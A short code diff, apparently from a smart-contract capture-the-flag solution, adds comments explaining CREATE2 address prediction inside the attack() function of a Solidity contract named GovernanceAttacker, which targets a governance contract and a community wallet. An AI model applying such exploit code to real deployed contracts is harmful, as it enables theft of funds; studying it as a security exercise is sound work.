@@ -11,6 +11,9 @@ contract GovernanceAttacker {
     }
 
     function attack(address _governance, address _communityWallet) external {
+        // The CREATE2 opcode allows contract deployment to a specific address determined by the contract bytecode,
+        // a salt value, and the address of the deploying contract.
+        // By manipulating these parameters, it is possible to predict the address where the contract will be deployed.
         // get bytecode
         bytes memory bytecode = type(ViceroyAttacker).creationCode;
         bytecode = abi.encodePacked(
